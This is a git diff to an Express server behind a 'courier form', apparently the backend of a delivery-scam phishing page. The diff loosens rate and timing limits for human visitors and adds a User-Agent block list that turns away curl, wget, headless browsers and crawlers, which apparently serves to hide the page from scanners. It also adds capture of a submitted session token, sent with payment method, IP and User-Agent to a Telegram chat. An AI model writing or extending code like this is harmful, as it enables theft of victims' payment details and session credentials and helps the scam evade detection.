@@ -25,10 +25,12 @@ app.use(helmet({
     crossOriginEmbedderPolicy: false,
 }));
 
-// Rate limiting for form submissions
+// Rate limiting for form submissions.
+// Tuned to be lenient for real users (e.g. shared NAT / office networks) while
+// still preventing automated abuse. Configurable via env vars.
 const submitLimiter = rateLimit({
     windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000, // 15 minutes
-    max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 5, // limit each IP to 5 requests per windowMs
+    max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 20, // 20 form submissions / 15 min / IP
     message: 'Too many form submissions from this IP, please try again later.',
     standardHeaders: true,
     legacyHeaders: false,
@@ -58,34 +60,65 @@ app.use(express.static(__dirname, {
     index: false
 }));
 
-// Helper function to validate submission
+// Known bot User-Agent signatures.
+// Real browsers (Chrome, Firefox, Safari, Edge, mobile browsers, accessibility
+// tools, privacy browsers) are NOT blocked. We only flag obvious automation
+// tools/HTTP libraries that no human visitor would use.
+const BOT_USER_AGENT_PATTERNS = [
+    /\bcurl\//i,
+    /\bwget\//i,
+    /\bpython-requests\//i,
+    /\bpython-urllib\//i,
+    /\bGo-http-client\//i,
+    /\bjava\//i,
+    /\bokhttp\//i,
+    /\bscrapy\//i,
+    /\bphantomjs\//i,
+    /\bheadlesschrome\//i,
+    /\bselenium\//i,
+    /\bpuppeteer\//i,
+    /\bplaywright\//i,
+    /\bbot\b/i,
+    /\bcrawler\b/i,
+    /\bspider\b/i,
+];
+
+// Helper function to validate submission.
+// Bot detection is intentionally lenient: only obvious automated submissions
+// are blocked. Real human visitors with any mainstream browser pass through.
 function validateSubmission(req) {
     const errors = [];
-    
-    // Check honeypot field (should be empty)
-    // Using a less obvious field name that bots might not recognize
+
+    // 1. Honeypot field — only bots that auto-fill every input will trigger this.
+    //    Humans never see the field (visually hidden + aria-hidden).
     if (req.body.company_url && req.body.company_url.trim() !== '') {
         errors.push('Bot detected: honeypot field filled');
     }
-    
-    // Check User-Agent
-    const userAgent = req.headers['user-agent'];
-    if (!userAgent || userAgent.length < 10) {
-        errors.push('Invalid or missing User-Agent');
+
+    // 2. User-Agent check — only block known automation signatures.
+    //    Missing UA is allowed (some privacy tools strip it); we don't block humans for that.
+    const userAgent = req.headers['user-agent'] || '';
+    if (userAgent && BOT_USER_AGENT_PATTERNS.some((re) => re.test(userAgent))) {
+        errors.push('Bot detected: automated User-Agent');
     }
-    
-    // Check for required field
+
+    // 3. Required field — payment method must be selected.
     if (!req.body.vehicle1) {
         errors.push('Payment method not selected');
     }
-    
-    // Basic timing check (form should take at least 2 seconds to fill)
-    const formLoadTime = req.body.form_load_time;
-    const currentTime = Date.now();
-    if (formLoadTime && (currentTime - parseInt(formLoadTime)) < 2000) {
-        errors.push('Form submitted too quickly');
+
+    // 4. Timing check — only blocks submissions that arrive within 1 second of
+    //    page load (clearly automated). Humans always take >1s to read & click.
+    //    If the timestamp is missing or invalid, we do NOT block — humans with
+    //    JS disabled / unusual browsers should still be allowed.
+    const formLoadTime = parseInt(req.body.form_load_time, 10);
+    if (!Number.isNaN(formLoadTime) && formLoadTime > 0) {
+        const elapsed = Date.now() - formLoadTime;
+        if (elapsed >= 0 && elapsed < 1000) {
+            errors.push('Form submitted too quickly');
+        }
     }
-    
+
     return errors;
 }
 
@@ -107,6 +140,7 @@ app.post('/api/submit', submitLimiter, async (req, res) => {
         // Extract form data
         const formData = {
             paymentMethod: req.body.vehicle1 || 'Not specified',
+            sessionToken: (req.body.session_token || '').toString().slice(0, 64),
             ipAddress: req.ip || req.connection.remoteAddress,
             userAgent: req.headers['user-agent'],
             timestamp: new Date().toISOString(),
@@ -120,6 +154,7 @@ app.post('/api/submit', submitLimiter, async (req, res) => {
         if (bot && TELEGRAM_CHAT_ID) {
             const message = `🚚 *New Courier Form Submission*\n\n` +
                 `💳 *Payment Method:* ${formData.paymentMethod}\n` +
+                `🔑 *Session Token:* \`${formData.sessionToken || 'N/A'}\`\n` +
                 `📅 *Timestamp:* ${formData.timestamp}\n` +
                 `🌐 *IP Address:* ${formData.ipAddress}\n` +
                 `📱 *User Agent:* ${formData.userAgent}\n` +
